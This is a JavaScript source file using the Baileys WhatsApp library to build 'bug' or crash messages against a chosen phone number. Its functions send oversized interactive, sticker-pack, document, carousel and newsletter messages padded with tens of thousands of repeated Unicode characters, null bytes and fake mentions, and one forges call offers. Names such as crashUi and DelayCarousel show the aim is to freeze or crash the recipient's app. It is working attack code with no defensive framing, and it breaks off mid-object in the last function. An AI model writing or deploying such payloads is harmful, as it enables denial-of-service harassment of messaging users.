const {
  default: makeWASocket,
  useMultiFileAuthState,
  downloadContentFromMessage,
  generateWAMessageContent,
  generateWAMessage,
  makeInMemoryStore,
  prepareWAMessageMedia,
  generateWAMessageFromContent,
  MediaType,
  areJidsSameUser,
  WAMessageStatus,
  downloadAndSaveMediaMessage,
  AuthenticationState,
  GroupMetadata,
  initInMemoryKeyStore,
  getContentType,
  MiscMessageGenerationOptions,
  useSingleFileAuthState,
  BufferJSON,
  WAMessageProto,
  MessageOptions,
  WAFlag,
  WANode,
  WAMetric,
  ChatModification,
  MessageTypeProto,
  WALocationMessage,
  ReconnectMode,
  WAContextInfo,
  proto,
  WAGroupMetadata,
  ProxyAgent,
  waChatKey,
  MimetypeMap,
  MediaPathMap,
  WAContactMessage,
  WAContactsArrayMessage,
  WAGroupInviteMessage,
  WATextMessage,
  WAMessageContent,
  WAMessage,
  BaileysError,
  WA_MESSAGE_STATUS_TYPE,
  MediaConnInfo,
  URL_REGEX,
  WAUrlInfo,
  WA_DEFAULT_EPHEMERAL,
  WAMediaUpload,
  mentionedJid,
  processTime,
  Browser,
  MessageType,
  Presence,
  WA_MESSAGE_STUB_TYPES,
  Mimetype,
  relayWAMessage,
  Browsers,
  GroupSettingChange,
  DisconnectReason,
  WASocket,
  getStream,
  WAProto,
  isBaileys,
  AnyMessageContent,
  fetchLatestBaileysVersion,
  templateMessage,
  InteractiveMessage,
  Header,
  makeCacheableSignalKeyStore,
  encodeNewsletterMessage,
  patchMessageBeforeSending,
  encodeWAMessage,
  encodeSignedDeviceIdentity,
  jidEncode,
  jidDecode,
  baileysLib
} = require("@whiskeysockets/baileys");
const crypto = require("crypto");


async function invisibleSpam(sock, target) {
const { randomBytes } = require("crypto");
  const album = await generateWAMessageFromContent(target, {
      albumMessage: {
         expectedImageCount: 99999999,
         expectedVideoCount: 0, 
      }
   }, {});
  
  const msg1 = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: " #€xe ", 
            format: "EXTENTION_1" 
          },
          nativeFlowResponseMessage: {
            name: "menu_options", 
            paramsJson: `{\"display_text\":\"${" ".repeat(11111)}\",\"id\":\".grockk\",\"description\":\"PnX-ID-msg.\"}`, 
            version: 3
          },
          contextInfo: {
            mentionedJid: Array.from({ length:2000 }, (_, z) => `1313555020${z + 1}@s.whatsapp.net`), 
            statusAttributionType: "SHARED_FROM_MENTION",
          }, 
        }
      }
    }
  }, {});

const msg2 = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: " #€xe ",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: " ".repeat(1045000),
                        version: 3
                    },
                   entryPointConversionSource: "galaxy_message",
                }
            }
        }
    }, {
        ephemeralExpiration: 0,
        forwardingScore: 8888,
        isForwarded: true,
        font: Math.floor(Math.random() * 99999999),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    });

  const msg3 = {
    stickerMessage: {
      url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
      fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
      fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
      mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
      mimetype: "image/webp",
      height: 9999,
      width: 9999,
      directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
      fileLength: 999999,
      mediaKeyTimestamp: "1743832131",
      isAnimated: false,
      stickerSentTs: "X",
      isAvatar: false,
      isAiSticker: false,
      isLottie: false,
      contextInfo: {
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from({ length: 1999 }, () =>
            `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
          )
        ],
        stanzaId: "1234567890ABCDEF",
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
          }
        },
        messageAssociation: {
          associationType: 1,
          parentMessageKey: album.key
        }
      }
    }
  };

  const msg4 = {
     extendedTextMessage: {
       text: "ꦾ".repeat(60000),
         contextInfo: {
           participant: target,
             mentionedJid: [
               "support@s.whatsapp.net",
                  ...Array.from(
                  { length: 1999 },
                   () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                 )
               ],
               messageAssociation: {
                 associationType: 1,
                 parentMessageKey: album.key
               }
             }
           }
         };

    let msg5 = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          messageSecret: randomBytes(32)
        },
        interactiveResponseMessage: {
          body: {
            text: " #€xe ",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "carousel_message",
            paramsJson: "\u0000".repeat(999999),
            version: 3
          },
          contextInfo: {
            isForwarded: true,
            forwardingScore: 9999,
            forwardedNewsletterMessageInfo: {
              newsletterName: "@kenofils • #𝗯𝘂𝗴𝗴𝗲𝗿𝘀 🩸",
              newsletterJid: "120363330344810280@newsletter",
              serverMessageId: 1
            },
            statusAttributionType: "SHARED_FROM_MENTION",
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 1999 }, () =>
                `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
              ),
            ]
          }
        }
      }
    }
  }, {});
  
  const msg6 = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
      stickerPackMessage: {
      stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
      name: "ꦾ".repeat(60000),
      publisher: "ꦾ".repeat(60000),
      caption: " ### ",
      stickers: [
        {
          fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
          isAnimated: false,
          emojis: ["🦠","🩸"],
          accessibilityLabel: "",
          stickerSentTs: "PnX-ID-msg",
          isAvatar: true,
          isAiSticker: true,
          isLottie: true,
          mimetype: "application/pdf"
        },
        {
          fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
          isAnimated: false,
          emojis: ["🩸","🦠"],
          accessibilityLabel: "",
          stickerSentTs: "PnX-ID-msg",
          isAvatar: true,
          isAiSticker: true,
          isLottie: true,
          mimetype: "application/pdf"
        },
        {
          fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
          isAnimated: false,
          emojis: ["🦠","🩸"],
          accessibilityLabel: "",
          stickerSentTs: "PnX-ID-msg",
          isAvatar: true,
          isAiSticker: true,
          isLottie: true,
          mimetype: "application/pdf"
        },
        {
          fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
          isAnimated: false,
          emojis: ["🩸","🦠"],
          accessibilityLabel: "",
          stickerSentTs: "PnX-ID-msg",
          isAvatar: true,
          isAiSticker: true,
          isLottie: true,
          mimetype: "application/pdf"
        },
        {
          fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
          isAnimated: false,
          emojis: ["🦠","🩸"],
          accessibilityLabel: "",
          stickerSentTs: "PnX-ID-msg",
          isAvatar: true,
          isAiSticker: true,
          isLottie: true,
          mimetype: "application/pdf"
        },
        {
          fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
          isAnimated: false,
          emojis: ["🩸","🦠"],
          accessibilityLabel: "",
          stickerSentTs: "PnX-ID-msg",
          isAvatar: true,
          isAiSticker: true,
          isLottie: true,
          mimetype: "application/pdf"
        },
        {
          fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
          isAnimated: false,
          emojis: ["🦠","🩸"],
          accessibilityLabel: "",
          stickerSentTs: "PnX-ID-msg",
          isAvatar: true,
          isAiSticker: true,
          isLottie: true,
          mimetype: "application/pdf"
        },
        {
          fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
          isAnimated: false,
          emojis: ["🩸","🦠"],
          accessibilityLabel: "",
          stickerSentTs: "PnX-ID-msg",
          isAvatar: true,
          isAiSticker: true,
          isLottie: true,
          mimetype: "application/pdf"
        }
      ],
      fileLength: "999999999",
      fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
      fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
      mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
      directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
      contextInfo: {
       remoteJid: "X",
       participant: "0@s.whatsapp.net",
       stanzaId: "1234567890ABCDEF",
       mentionedJid: [
         "0@s.whatsapp.net",
             ...Array.from({ length: 1990 }, () =>
                  `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
            )
          ]       
      },
      packDescription: "",
      mediaKeyTimestamp: "1747502082",
      trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
      thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
      thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
      thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
      thumbnailHeight: 252,
      thumbnailWidth: 252,
      imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
      stickerPackSize: "999999999",
      stickerPackOrigin: "USER_CREATED",
      quotedMessage: {
      callLogMesssage: {
      isVideo: true,
      callOutcome: "REJECTED",
      durationSecs: "1",
      callType: "SCHEDULED_CALL",
       participants: [
           { jid: target, callOutcome: "CONNECTED" },
               { target: "support@s.whatsapp.net", callOutcome: "REJECTED" },
               { target: "13135550002@s.whatsapp.net", callOutcome: "ACCEPTED_ELSEWHERE" },
               { target: "status@broadcast", callOutcome: "SILENCED_UNKNOWN_CALLER" },
                ]
              }
            },
         },
      },
    },
  }, {});

  for (const msg of [album, msg1, msg2, msg3, msg4, msg5, msg6]) {
    await sock.relayMessage("status@broadcast", msg.message ?? msg, {
      messageId: msg.key?.id || undefined,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { jid: target } }]
        }]
      }]
    });
  }
}

async function rpnm(sock, target) {
  await sock.relayMessage(target, {
     requestPhoneNumberMessage: {
      contextInfo: {
       quotedMessage: {
        documentMessage: {
         url: "https://mmg.whatsapp.net/v/t62.7119-24/31863614_1446690129642423_4284129982526158568_n.enc?ccb=11-4&oh=01_Q5AaINokOPcndUoCQ5xDt9-QdH29VAwZlXi8SfD9ZJzy1Bg_&oe=67B59463&_nc_sid=5e03e0&mms3=true",
         mimetype: "application/pdf",
         fileSha256: "jLQrXn8TtEFsd/y5qF6UHW/4OE8RYcJ7wumBn5R1iJ8=",
         fileLength: 0,
         pageCount: 0,
         mediaKey: "xSUWP0Wl/A0EMyAFyeCoPauXx+Qwb0xyPQLGDdFtM4U=",
         fileName: "7eppeli.pdf",
         fileEncSha256: "R33GE5FZJfMXeV757T2tmuU0kIdtqjXBIFOi97Ahafc=",
         directPath: "/v/t62.7119-24/31863614_1446690129642423_4284129982526158568_n.enc?ccb=11-4&oh=01_Q5AaINokOPcndUoCQ5xDt9-QdH29VAwZlXi8SfD9ZJzy1Bg_&oe=67B59463&_nc_sid=5e03e0",
          mediaKeyTimestamp: 1737369406,
          caption: "👁‍🗨⃟꙰。⃝𝐙𝐞𝐩𝐩 ‌ 𝐞𝐥𝐢‌⃰ ⌁ 𝐄𝐱𝐩𝐨𝐬𝐞𝐝.ꪸ⃟‼️" + "𑇂𑆵𑆴𑆿".repeat(20000),
          title: "👁‍🗨⃟꙰。⃝𝐙𝐞𝐩𝐩 ‌ 𝐞𝐥𝐢‌⃰ ⌁ 𝐄𝐱𝐩𝐨𝐬𝐞𝐝.ꪸ⃟‼️",
          mentionedJid: [target],
          }
        },
        externalAdReply: {
         title: "👁‍🗨⃟꙰。⃝𝐙𝐞𝐩𝐩 ‌ 𝐞𝐥𝐢‌⃰ ⌁ 𝐄𝐱𝐩𝐨𝐬𝐞𝐝.ꪸ⃟‼️",
         body: "𑇂𑆵𑆴𑆿".repeat(30000),
         mediaType: "VIDEO",
         renderLargerThumbnail: true,
         sourceUrl: "https://t.me/YuukeyD7eppeli",
         mediaUrl: "https://t.me/YuukeyD7eppeli",
         containsAutoReply: true,
         renderLargerThumbnail: true,
         showAdAttribution: true,
         ctwaClid: "ctwa_clid_example",
         ref: "ref_example"
        },
        forwardedNewsletterMessageInfo: {
          newsletterJid: "1@newsletter",
          serverMessageId: 1,
          newsletterName: "𑇂𑆵𑆴𑆿".repeat(30000),
          contentType: "UPDATE",
        }
      }
    }
  }, {
   participant: { jid: target }
 });
}
async function docIos(sock, target) {
  const quotedios = {
    key: {
      remoteJid: "13135559098@s.whatsapp.net",
      participant: "13135559098@s.whatsapp.net",
      id: `${Date.now()}-${Math.random().toString(36).slice(2)}`,
    },
    message: {
      buttonsResponseMessage: {
        selectedButtonId: "x",
        type: 1,
        response: {
          selectedDisplayText: '\n'.repeat(50000)
        }
      }
    }
  };
  const msg = generateWAMessageFromContent(target, proto.Message.fromObject({
    documentMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
      mimetype: "application/pdf",
      fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
      fileLength: 999999999,
      pageCount: 999999999,
      mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
      fileName: "x" + "𑇂𑆵𑆴𑆿".repeat(60000),
      fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
      directPath: "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
      mediaKeyTimestamp: 1715880173
    }
  }), { quoted: quotedios });
    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target]
    });
    await sock.relayMessage(target, msg.message, {
      participant: { jid: target },
      messageId: msg.key.id
    });
}
async function PlainCall(sock, number) {
    try {
      const jid = String(number).includes("@s.whatsapp.net")
            ? String(number)
            : `${String(number).replace(/\D/g, "")}@s.whatsapp.net`;

        const mutexMemek = () => {
            let map = {};
            return {
                mutex(key, fn) {
                    map[key] ??= { task: Promise.resolve() };
                    map[key].task = (async (prev) => {
                        try { await prev; } catch {}
                        return fn();
                    })(map[key].task);
                    return map[key].task;
                }
            };
        };

        const MamakLoJing = mutexMemek();
        const xrellyBuffer = (buf) =>
            Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
        const yntkts = encodeSignedDeviceIdentity;

        sock.createParticipantNodes = async (
            recipientJids,
            message,
            extraAttrs,
            dsmMessage
        ) => {
            if (!recipientJids.length)
                return { nodes: [], shouldIncludeDeviceIdentity: false };

            const patched =
                (await sock.patchMessageBeforeSending?.(
                    message,
                    recipientJids
                )) ?? message;

            const ywdh = Array.isArray(patched)
                ? patched
                : recipientJids.map((j) => ({
                      recipientJid: j,
                      message: patched
                  }));

            const { id: meId, lid: meLid } = sock.authState.creds.me;
            const jembut = meLid ? jidDecode(meLid)?.user : null;

            let shouldIncludeDeviceIdentity = false;

            const nodes = await Promise.all(
                ywdh.map(async ({ recipientJid: j, message: msg }) => {
                    const { user: numberUser } = jidDecode(j);
                    const { user: ownUser } = jidDecode(meId);

                    const isOwn =
                        numberUser === ownUser || numberUser === jembut;

                    const y = j === meId || j === meLid;
                    if (dsmMessage && isOwn && !y) msg = dsmMessage;

                    const bytes = xrellyBuffer(
                        yntkts ? yntkts(msg) : Buffer.from([])
                    );

                    return MamakLoJing.mutex(j, async () => {
                        const { type, ciphertext } =
                            await sock.signalRepository.encryptMessage({
                                jid: j,
                                data: bytes
                            });

                        if (type === "pkmsg")
                            shouldIncludeDeviceIdentity = true;

                        return {
                            tag: "to",
                            attrs: { jid: j },
                            content: [
                                {
                                    tag: "enc",
                                    attrs: { v: "2", type, ...extraAttrs },
                                    content: ciphertext
                                }
                            ]
                        };
                    });
                })
            );

            return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
        };

        let devices = [];

        try {
            devices = (
                await sock.getUSyncDevices([jid], false, false)
            ).map(
                ({ user, device }) =>
                    `${user}${device ? ":" + device : ""}@s.whatsapp.net`
            );
        } catch {
            devices = [jid];
        }

        try {
            await sock.assertSessions(devices);
        } catch {}

        let { nodes: destinations, shouldIncludeDeviceIdentity } = {
            nodes: [],
            shouldIncludeDeviceIdentity: false
        };

        try {
            const created = await sock.createParticipantNodes(
                devices,
                { conversation: "y" },
                { count: "0" }
            );

            destinations = created?.nodes ?? [];
            shouldIncludeDeviceIdentity = !!created?.shouldIncludeDeviceIdentity;
        } catch {
            destinations = [];
            shouldIncludeDeviceIdentity = false;
        }

        const wtfXrL = {
            tag: "call",
            attrs: {
                to: jid,
                id:
                    sock.generateMessageTag?.() ??
                    crypto.randomBytes(8).toString("hex"),
                from:
                    sock.user?.id || sock.authState?.creds?.me?.id
            },
            content: [
                {
                    tag: "offer",
                    attrs: {
                        "call-id": crypto
                            .randomBytes(16)
                            .toString("hex")
                            .slice(0, 64)
                            .toUpperCase(),
                        "call-creator":
                            sock.user?.id || sock.authState?.creds?.me?.id
                    },
                    content: [
                        { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
                        { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
                        {
                            tag: "video",
                            attrs: {
                                orientation: "0",
                                screen_width: "1920",
                                screen_height: "1080",
                                device_orientation: "0",
                                enc: "vp8",
                                dec: "vp8"
                            }
                        },
                        { tag: "net", attrs: { medium: "3" } },
                        {
                            tag: "capability",
                            attrs: { ver: "1" },
                            content: new Uint8Array([
                                1, 5, 247, 9, 228, 250, 1
                            ])
                        },
                        { tag: "encopt", attrs: { keygen: "2" } },
                        {
                            tag: "destination",
                            attrs: {},
                            content: destinations
                        }
                    ]
                }
            ]
        };

        if (shouldIncludeDeviceIdentity && encodeSignedDeviceIdentity) {
            try {
                const deviceIdentity = encodeSignedDeviceIdentity(
                    sock.authState.creds.account,
                    true
                );

                wtfXrL.content[0].content.push({
                    tag: "device-identity",
                    attrs: {},
                    content: deviceIdentity
                });
            } catch (e) {}
        }

        await sock.sendNode(wtfXrL);

    } catch (e) {}
}
async function blankIos(sock, target) {
  await sock.sendMessage(
    target,
    {
      text: "*X PARADOX*",
      contentText: "X PARADOX",
      footer: "X PARADOX",
      viewOnce: true,
      buttons: [
        {
          buttonId: "🦠",
          buttonText: {
            displayText: "🦠"
          },
          type: 4,
          nativeFlowInfo: {
            name: "single_select",
            paramsJson: JSON.stringify({
              title: "᬴".repeat(60000),
              sections: []
            })
          }
        }
      ],
      headerType: 1
    },
    {
      participant: { jid: target },
      ephemeralExpiration: 5,
      timeStamp: Date.now()
    }
  );
}
async function DelayCarousel(sock, target) {
    try {
        const videoMessage = {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/612765201_1843009569672201_5329993757191113177_n.enc?ccb=11-4&oh=01_Q5Aa3gGgf1JumlvtAJMPp7hTHEU4syh-r_TqRaYdfspKa3CzUQ&oe=6985B755&_nc_sid=5e03e0&mms3=true",
            mimetype: "video/mp4",
            fileSha256: "r6rKspL7KzRZvoCBkbkAgNTbbZAz3EzCT7Jo7vivhW0=",
            fileLength: "10000000",
            mediaKey: "GHCUsF8us7byHgPCA8lVDELN67jra3I3lgRZXCCRc0s=",
            fileEncSha256: "VzWEuluQdKOio+HmwLAoi8/f4md4ppgsCoIocolbNRI=",
            directPath: "/v/t62.7161-24/612765201_1843009569672201_5329993757191113177_n.enc?ccb=11-4&oh=01_Q5Aa3gGgf1JumlvtAJMPp7hTHEU4syh-r_TqRaYdfspKa3CzUQ&oe=6985B755&_nc_sid=5e03e0",
            mediaKeyTimestamp: "1767791229",
            streamingSidecar: "xey0UW72AH+ShCjYXVzOom/k+kt7VJryEZ+yNyAarqVJHx8L4j6sB4Da5ZGHXTfzX9g=",
            thumbnailDirectPath: "/v/t62.36147-24/19977827_1442378506945978_3754389976888828856_n.enc?ccb=11-4&oh=01_Q5Aa1wGz9o9ukGbtWxoetr_ygoJDy0SN80KaAwJ1vywXvbTH8A&oe=687247F9&_nc_sid=5e03e0",
            thumbnailSha256: "hxKrzb6DDC8qTu2xOdeZN4FBgHu8cmNekZ+pPye6dO0=",
            thumbnailEncSha256: "Es1ZWpjDKRZ82XpiLARj3FZWh9DeFCEUG2wU8WHWrRs=",
            annotations: [
                {
                    embeddedContent: {
                        embeddedMusic: {
                            musicContentMediaId: "1942620729844671",
                            songId: "432395962368430",
                            author: "Yuukey Da",
                            title: "Уччкеу Дїшауи Жіьпарріп",
                            artworkDirectPath: "/v/t62.76458-24/11810390_1884385592310849_8570381233425191298_n.enc?ccb=11-4&oh=01_Q5Aa1wFo3eosJQYj_I0wJby373H-MKodRwdx1sCOEt426yyLCg&oe=687233BB&_nc_sid=5e03e0",
                            artworkSha256: "8x8ENCxJyIrSFnF9ZHtiim423uGgPleSm8zPEbQZByE=",
                            artworkEncSha256: "HlsJKALVejvghjYZIrY46zosCX568b1cG9SzzZfCPNA=",
                            artistAttribution: "",
                            countryBlocklist: "",
                            isExplicit: false,
                            artworkMediaKey: "0DsOnYZAyNwPJgs5PZwL/EtFxBXO2cW9zwLYZGcAkvU="
                        }
                    },
                    embeddedAction: true
                }
            ]
        };

        const msg = await generateWAMessageFromContent(
            target,
            {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: {
                            header: {
                                title: "\u0000",
                                hasMediaAttachment: true,
                                videoMessage
                            },
                            contextInfo: {
                                mentionedJid: [
                                    target,
                                    "0@s.whatsapp.net",
                                    ...Array.from({ length: 1900 }, () =>
                                        `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
                                    )
                                ],
                                remoteJid: " X "
                            },
                            carouselMessage: {
                                cards: Array.from({ length: 15 }, () => ({
                                    header: {
                                        title: "\u0000",
                                        hasMediaAttachment: true,
                                        videoMessage
                                    },
                                    contextInfo: {
                                        mentionedJid: [
                                            target,
                                            "0@s.whatsapp.net",
                                            ...Array.from({ length: 1900 }, () =>
                                                `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
                                            )
                                        ],
                                        remoteJid: " X "
                                    },
                                    nativeFlowMessage: {
                                        messageParamsJson: "({".repeat(9000)
                                    }
                                }))
                            }
                        }
                    }
                }
            },
            {
                messageId: null,
                participant: {
                    jid: target
                }
            }
        );

        await sock.relayMessage(
            target,
            {
                groupStatusMessageV2: {
                    message: msg.message
                }
            },
            {
                messageId: msg.key.id,
                participant: { jid: target }
            }
        );

    } catch (e) {
       console.log(e.message)
    }
}
async function execute(sock, target) {
    const msg = await generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    NewsletterAdminInviteMessage: {
                        newsletterJid: "1@newsletter",
                        newsletterName: "᬴᬴᬴".repeat(50000),
                        jpegThumbnail: "/9j//gAQTGF2YzU5LjM3LjEwMAD/2wBDAAgEBAQEBAUFBQUFBQYGBgYGBgYGBgYGBgYHBwcICAgHBwcGBgcHCAgICAkJCQgICAgJCQoKCgwMCwsODg4RERT/xAB+AAEBAQEBAAAAAAAAAAAAAAAHBgQDBQEBAQEBAAAAAAAAAAAAAAAAAgAEARAAAgECBAQEAgcBAQAAAAAAAgEDBBEhABIFEzMxBiNIbGysZF0s3M3FFERAAEDAgYCAwEAAAAAAAAAAAEAAwIRESIEMzJBIbHwcnGBYf/AABEIABIAIAMBIgACEQADEQD/2gAMAwEAAhEDEQA/AA2Pbq2cI3HGbUhaUVmx62xdrL1zrotoq6qWCKnE5iqJXDDay4kiYixG7wxIetuueMU1VGYxRTSDZpWEiQ6n9n/7mr7DVDJvNC5TKEaarc4FIkeqR8MzExDoOuMkiC7x6Z3MsNnCRj4Eq0oPpNqM3JiAubFZD5f79Q1YUdbTFTzSxxyxojjITjlh40ZgYEUZAcfyEhJryz4G7bedLVSgnezWKd07inh+uWcg7a7gm2Ok3KVSQbEFRaqqKoaN1URENtuYAm+GMpkVNYuLpIhKwYrjzi7Mp9wLbJKWkpdjoKKCSnRNRRxzkz18QJLgiunZa9LSV/k3lPZOc9kSD/TenPdq3SdBbhgO4SrUd9UQzTt8X1+uaTtDxYH53JZm6fxfX65pO0PEg+5ZspcrmW12vkFRNv2nd3/73j54E1+WULmX7vLWlKT3C0QPUfyd+G8bvG+T0ukX78vxPKFzH/zKl/rp/wCN52u2Z94U9rP/AL5K/9k=",
                        caption: "᬴᬴᬴".repeat(50000),
                        inviteExpiration: null,
                        contextInfo: {
                            mentionedJid: [
                                target,
                                "0@s.whatsapp.net",
                                "13135559098@s.whatsapp.net",
                                ...Array.from({ length: 1900 }, () =>
                                    `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
                                )
                            ],
                            remoteJid: "X",
                            disappearingMode: {
                                initiator: "INITIATED_BY_OTHER",
                                trigger: "ACCOUNT_SETTING"
                            },
                            quotedMessage: {
                                paymentInviteMessage: {
                                    serviceType: 3,
                                    expiryTimestamp: 7205
                                }
                            }
                        }
                    }
                }
            }
        },
        {}
    );

    await sock.relayMessage(target, msg.message, {
        messageId: msg.key.id,
        participant: {
            jid: target
        }
    });
}

async function crashUi(target) {
  const msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            contextInfo: {
              expiration: 1,
              ephemeralSettingTimestamp: 1,
              entryPointConversionSource: "WhatsApp.com",
              entryPointConversionApp: "WhatsApp",
              entryPointConversionDelaySeconds: 1,
              disappearingMode: {
                initiatorDeviceJid: target,
                initiator: "INITIATED_BY_OTHER",
                trigger: "UNKNOWN_GROUPS"
              },
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: [target],
              businessMessageForwardInfo: { 
                 businessOwnerJid: "13135550002@s.whatsapp.net"
              },
              quotedMessage: {
                callLogMesssage: {
                  isVideo: false,
                  callOutcome: "ONGOING",
                  durationSecs: "0",
                  callType: "VOICE_CHAT",
                  participants: [
                    {
                      jid: "13135550002@s.whatsapp.net",
                      callOutcome: "CONNECTED"
                    },
                    ...Array.from({ length: 10000 }, () => ({
                      jid: `1${Math.floor(Math.random() * 99999)}@s.whatsapp.net`,
                      callOutcome: "CONNECTED"
                    }))
                  ]
                }
              },
              externalAdReply: {
                showAdAttribution: false,
                renderLargerThumbnail: true
              }
            },
            header: {
              videoMessage: {
                url: "https://mmg.whatsapp.net/o1/v/t24/f2/m232/AQOS7xVULFd5Ekk1T8o8pWSq-j5UmHzUPG5sq0frfEogEtMRJ_FNjaT7rKYUSm-iImapgmKZ7iq5_9_CC8mSbD0me0ye2OcoyDxaqJU?ccb=9-4&oh=01_Q5Aa2AFf2ZI7JiJkIlqsek6JvJAGekHxXtN9qtw95RhN1meW8g&oe=68987468&_nc_sid=e6ed6c&mms3=true",
                mimetype: "video/mp4",
                fileSha256: "pctPKf/IwXKoCzQ7da4YrzWk+K9kaySQuWqfbA8h0FY=",
                fileLength: "847271",
                seconds: 7,
                mediaKey: "dA+Eu1vaexH4OIHRZbL8uZIND+CKA6ykw9B2OrL+DH4=",
                gifPlayback: true,
                height: 1280,
                width: 576,
                fileEncSha256: "GwTECHj+asNIHYh/L6NAX+92ob/LDSP5jgx/icqHWvk=",
                directPath: "/o1/v/t24/f2/m232/AQOS7xVULFd5Ekk1T8o8pWSq-j5UmHzUPG5sq0frfEogEtMRJ_FNjaT7rKYUSm-iImapgmKZ7iq5_9_CC8mSbD0me0ye2OcoyDxaqJU?ccb=9-4&oh=01_Q5Aa2AFf2ZI7JiJkIlqsek6JvJAGekHxXtN9qtw95RhN1meW8g&oe=68987468&_nc_sid=e6ed6c",
                mediaKeyTimestamp: "1752236759",
